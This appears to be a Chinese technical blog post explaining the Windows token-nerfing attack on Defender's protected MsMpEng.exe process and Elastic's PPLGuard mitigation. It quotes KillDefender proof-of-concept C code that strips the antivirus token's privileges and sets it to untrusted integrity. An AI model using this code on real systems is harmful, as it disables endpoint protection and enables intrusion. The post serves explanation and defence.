0. 概述

本文阐述Windows令牌弱化攻击 (Windows Token Nerfing Attacks)。其攻击手法和缓解措施由Elastic安全团队Sandboxing Antimalware Products for Fun and Profit[1]公开

p.s. 该团队真的是开发ELK的那个Elastic的安全研究团队

1. Token Nerfing Attacks

该攻击是针对PPL进程的，文章以Windows Defender的MsMpEng.exe进程举例

对于一个PPL进程，攻击者在PPL等级低于目标进程的前提下，只能获取权限极为有限的进程句柄 (例如只有PROCESS_QUERY_LIMITED_INFORMATION)。但Windows的PPL安全机制仅仅保护了进程而没有保护进程的令牌，所以一个non-PPL的进程在具备SeDebugPrivilege时，可以获取到TOKEN_ALL_ACCESS的目标进程的令牌

接着通过移除目标进程令牌的所有权限并降低完整性级别，来使得目标进程功能失效 (对于像Windows Defender这样的AV进程来说)

KillDefender[2]项目实现了该POC


BOOL token = OpenProcessToken(phandle, TOKEN_ALL_ACCESS, &ptoken);
// Remove all privilegesSetPrivilege(ptoken, SE_DEBUG_NAME, TRUE);SetPrivilege(ptoken, SE_CHANGE_NOTIFY_NAME, TRUE);SetPrivilege(ptoken, SE_TCB_NAME, TRUE);SetPrivilege(ptoken, SE_IMPERSONATE_NAME, TRUE);SetPrivilege(ptoken, SE_LOAD_DRIVER_NAME, TRUE);SetPrivilege(ptoken, SE_RESTORE_NAME, TRUE);SetPrivilege(ptoken, SE_BACKUP_NAME, TRUE);SetPrivilege(ptoken, SE_SECURITY_NAME, TRUE);SetPrivilege(ptoken, SE_SYSTEM_ENVIRONMENT_NAME, TRUE);SetPrivilege(ptoken, SE_INCREASE_QUOTA_NAME, TRUE);SetPrivilege(ptoken, SE_TAKE_OWNERSHIP_NAME, TRUE);SetPrivilege(ptoken, SE_INC_BASE_PRIORITY_NAME, TRUE);SetPrivilege(ptoken, SE_SHUTDOWN_NAME, TRUE);SetPrivilege(ptoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);
DWORD integrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;
SID integrityLevelSid{};integrityLevelSid.Revision = SID_REVISION;integrityLevelSid.SubAuthorityCount = 1;integrityLevelSid.IdentifierAuthority.Value[5] = 16;integrityLevelSid.SubAuthority[0] = integrityLevel;
TOKEN_MANDATORY_LABEL tokenIntegrityLevel = {};tokenIntegrityLevel.Label.Attributes = SE_GROUP_INTEGRITY;tokenIntegrityLevel.Label.Sid = &integrityLevelSid;
SetTokenInformation(    ptoken,    TokenIntegrityLevel,    &tokenIntegrityLevel,    sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(&integrityLevelSid)));


2. 缓解措施

Elastic安全团队同时公布了缓解措施 - PPLGuard[3]

它通过Windows一个未记录的Trusted Labels特性来保护AntiMalware PPL进程的Token不受篡改。该缓解措施的代码需要运行在WinTcb-Light级别下，所以该项目复用了PPLDump的代码

Trusted Labels是SACL[4]的一部分，下图是\KnownDlls的SACL


其中的SID S-1-19-1024-8192 解释为：

•1: Revision 1•19: SECURITY_PROCESS_TRUST_AUTHORITY•1024: SECURITY_PROCESS_PROTECTION_TYPE_FULL_RID•8192: SECURITY_PROCESS_PROTECTION_LEVEL_WINTCB_RID

该缓解措施的关键代码为：


SID_IDENTIFIER_AUTHORITY sidAuth = SECURITY_PROCESS_TRUST_AUTHORITY;AllocateAndInitializeSid(&sidAuth, SECURITY_PROCESS_TRUST_AUTHORITY_RID_COUNT,        SECURITY_PROCESS_PROTECTION_TYPE_LITE_RID,        SECURITY_PROCESS_PROTECTION_LEVEL_ANTIMALWARE_RID, 0, 0, 0, 0, 0, 0, &pPPLSID);InitializeAcl(pNewSACL, saclSize, ACL_REVISION);RtlAddProcessTrustLabelAce(pNewSACL, ACL_REVISION,        OBJECT_INHERIT_ACE | CONTAINER_INHERIT_ACE, pPPLSID,        SYSTEM_PROCESS_TRUST_LABEL_ACE_TYPE, TOKEN_READ);
SetSecurityInfo(hToken, SE_KERNEL_OBJECT, PROCESS_TRUST_LABEL_SECURITY_INFORMATION, NULL, NULL, NULL, pNewSACL);


通过设置MsMpEng.exe进程令牌的SACL，使仅AntiMalware-Light有令牌的读权限
